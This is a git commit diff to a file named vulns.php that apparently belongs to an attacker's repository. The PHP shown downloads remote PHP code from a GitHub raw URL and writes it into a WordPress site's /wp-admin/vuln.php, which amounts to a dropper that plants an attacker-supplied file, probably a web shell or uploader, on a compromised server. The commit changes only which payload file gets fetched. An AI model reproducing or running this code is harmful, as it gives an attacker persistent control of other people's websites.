acf09ffbd65642d2514935db281cd0444c94fb97
kalix-Ru <66873143+kalix-Ru@users.noreply.github.com>
2020-06-19 03:50:29 +0100

    Update vulns.php

--- vulns.php
+++ vulns.php
@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/vuln.php" ;
-$text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/up.php');
+$text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
